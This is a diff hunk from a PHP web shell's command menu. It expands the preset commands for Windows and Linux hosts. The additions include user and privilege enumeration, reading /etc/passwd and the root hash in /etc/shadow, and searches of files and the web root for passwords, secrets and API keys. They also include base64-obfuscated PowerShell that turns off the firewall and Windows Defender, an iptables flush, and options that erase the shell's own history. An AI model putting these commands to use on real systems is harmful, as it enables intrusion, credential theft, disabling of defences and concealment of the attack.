@@ -196,28 +196,44 @@ if (ini_get('file_uploads') && !empty($_FILES['upload'])) {
             <optgroup label="Windows">
               <option value="echo User Info: & whoami & echo User Info Detailed: & whoami /all & echo Session Info: & qwinsta & echo Net User Info: & net user">Show all groups/users</option>
               <option value="echo IPv4 Configuration: & netsh interface ipv4 show config & echo WLAN Profiles: & netsh wlan show profiles">Show network information</option>
-              <option value="tasklist">Show tasks</option>
-              <option value="driverquery | findstr Kernel">Show kernal drivers</option>
-              <option value="fsutil fsinfo drives">Show all drives</option>
-              <option value="set">Show enviroment vars</option>
-              <option value="curl checkip.amazonaws.com">Get public IP address</option>
-              <option value="powershell -ExecutionPolicy Bypass -Command Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('bmV0c2ggYWR2ZmlyZXdhbGwgc2V0IGFsbHByb2ZpbGVzIHN0YXRlIG9mZjtzYyBzdG9wIFdpbkRlZmVuZA==')))">(admin, b64) Disable Firewall+WinDefender</option>
-              <option value="powershell -ExecutionPolicy Bypass -Command Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('bmV0c2ggYWR2ZmlyZXdhbGwgc2V0IGFsbHByb2ZpbGVzIHN0YXRlIG9uO3NjIHN0YXJ0IFdpbkRlZmVuZA==')))">(admin, b64) Restore Firewall+WinDefender</option>
-              <option value="erase_history_windows">Erase ./WebShell History (Windows)</option>
+              <option value="systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; /C:&quot;System Type&quot; /C:&quot;Total Physical Memory&quot; & wmic cpu get Name,NumberOfCores,NumberOfLogicalProcessors /format:list">Show Hardware/OS Info</option>
+              <option value="tasklist">Show running processes</option>
+              <option value="driverquery | findstr Kernel">Show kernel drivers</option>
+              <option value="set">Show environment vars</option>
+              <option value="curl checkip.amazonaws.com & echo.">Get public IP address</option>
+              <option value="wmic product get name,version">List installed software</option>
+              <option value="dir /s /b *.ini *.txt *.log *.conf *.config 2>NUL | findstr /i /g:conffiles.txt">Find common config/log files (requires conffiles.txt with keywords)</option>
+              <option value="findstr /s /i &quot;password&quot; *.txt *.ini *.log *.config 2>NUL">Search for "password" in common files</option>
+              <option value="powershell -ExecutionPolicy Bypass -Command Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('bmV0c2ggYWR2ZmlyZXdhbGwgc2V0IGFsbHByb2ZpbGVzIHN0YXRlIG9mZjtzYyBzdG9wIFdpbkRlZmVuZA==')))">[ADMIN] (b64) Disable Firewall+Defender</option>
+              <option value="powershell -ExecutionPolicy Bypass -Command Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('bmV0c2ggYWR2ZmlyZXdhbGwgc2V0IGFsbHByb2ZpbGVzIHN0YXRlIG9uO3NjIHN0YXJ0IFdpbkRlZmVuZA==')))">[ADMIN] (b64) Restore Firewall+Defender</option>
+              <option value="netstat -ano | findstr LISTENING">List listening ports (with PID)</option>
+              <option value="whoami /priv">Show current user privileges</option>
+              <option value="reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run">List startup programs from registry</option>
+              <option value="schtasks /query /fo LIST /v">List scheduled tasks</option>
+              <option value="erase_history_windows">Erase WebShell History (Windows)</option>
             </optgroup>
           <?php else: ?>
             <optgroup label="Linux">
-              <option value="echo Whoami:;whoami;echo \\nUsers Logged On:;w;echo \\nUser  ID:;id;echo \\n/etc/passwd Contents:;cat /etc/passwd
-">Show all groups/users</option>
-              <option value="echo Network Connections:;nmcli con show;echo \\nInterfaces:;ifconfig;echo \\nWireless Interfaces:;iwconfig">Show network information</option>
-              <option value="lsof">Show all processes(SLOW)</option>
-              <option value="(ps aux --sort=-%cpu | head -n 26; ps aux --sort=-%mem | head -n 26) | sort -rnk 3,4 | uniq -f 10 | head -n 25">Show most active processes</option>
-              <option value="echo Kernel boot commands:;cat /proc/cmdline;echo Kernel parameters:;lsmod;sysctl -a">Show kernal information</option>
-              <option value="df -h">Show all drives</option>
-              <option value="printenv">Show enviroment vars</option>
-              <option value="curl checkip.amazonaws.com">Get public IP address</option>
-              <option value="sudo iptables -L > iptables.backup;sudo iptables -F">(sudo) Disable firewall</option <option value="sudo iptables-restore < iptables.backup">(sudo) Restore firewall</option>
-              <option value="erase_history_linux">Erase ./WebShell History (Linux)</option>
+              <option value="echo 'Whoami:'; whoami; echo '\nUsers Logged On:'; w; echo '\nUser ID:'; id; echo '\n/etc/passwd Contents:'; cat /etc/passwd">Show all groups/users</option>
+              <option value="echo 'Network Connections:'; nmcli con show 2>/dev/null || ip addr; echo '\nInterfaces:'; ifconfig 2>/dev/null || ip -s link; echo '\nWireless Interfaces:'; iwconfig 2>/dev/null || echo ' (iwconfig not found)'">Show network information</option>
+              <option value="echo 'CPU Info:'; lscpu; echo '\nMemory Info:'; free -h; echo '\nKernel Version:'; uname -a; echo '\nDisk Usage:'; df -h">Show Hardware/OS Info</option>
+              <option value="(ps aux --sort=-%cpu | head -n 15; echo; ps aux --sort=-%mem | head -n 15) | sort -rnk 3,4 | uniq -f 10 | head -n 25">Show most active processes</option>
+              <option value="echo 'Kernel boot commands:'; cat /proc/cmdline; echo '\nKernel modules:'; lsmod; echo '\nSysctl Kernel Info:'; sysctl -a | grep kernel">Show kernel information</option>
+              <option value="printenv">Show environment vars</option>
+              <option value="curl -s checkip.amazonaws.com; echo">Get public IP address</option>
+              <option value="lsof -nPi">Show open ports/processes</option>
+              <option value="cat /etc/crontab; crontab -l 2>/dev/null">List cron jobs</option>
+              <option value="find / -name &quot;*.conf&quot; -o -name &quot;*.config&quot; -o -name &quot;*.log&quot; -o -name &quot;*.bak&quot; 2>/dev/null | head -n 50">Find common config/backup/log files</option>
+              <option value="grep -r -i &quot;secret\|api_key&quot; /var/www/html 2>/dev/null | head -n 100">Search for strings in web root</option>
+              <option value="sudo -l 2>/dev/null">List user's sudo privileges</option>
+              <option value="sudo cat /etc/sudoers 2>/dev/null">[SUDO] View sudoers</option>
+              <option value="sudo iptables -L > iptables.backup.txt; sudo iptables -F; echo 'Firewall potentially disabled. Backup in iptables.backup.txt'">[SUDO] Disable firewall</option>
+              <option value="sudo iptables-restore < iptables.backup.txt; echo 'Firewall potentially restored from iptables.backup.txt'">[SUDO] Restore firewall</option>
+              <option value="sudo grep &quot;^root:&quot; sudo /etc/shadow 2>/dev/null">[SUDO] Check root hash</option>
+              <option value="find / -perm /4000 2>/dev/null | head -n 100">Find SUID/SGID bins</option>
+              <option value="ls -laR /var/www/html 2>/dev/null | head -n 100">List web root contents recursively</option>
+              <option value="journalctl -xe --no-pager | tail -n 100">View recent systemd journal logs</option>
+              <option value="erase_history_linux">Erase WebShell History (Linux)</option>
             </optgroup>
           <?php endif; ?>
         </select>
